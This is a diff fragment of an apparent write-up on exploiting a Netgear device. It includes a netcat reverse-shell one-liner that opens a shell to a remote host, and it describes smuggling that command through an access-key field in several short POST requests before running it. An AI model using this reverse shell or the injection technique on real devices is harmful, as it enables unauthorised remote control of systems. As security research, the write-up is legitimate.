@@ -291,5 +291,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 source: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 The next issue I ran into was length. Because the payload is appended to the access key, you can only send about 25 characters in a single post request. My solution was to just echo the oneliner into a bash script over 4 or 5 post requests, change the permission then execute the bash script. There may be a better way but I was able to get this to work.
+<img src="https://github.com/maguireja/netgear/blob/main/shell.gif?raw=true">
 
+#TODO
 
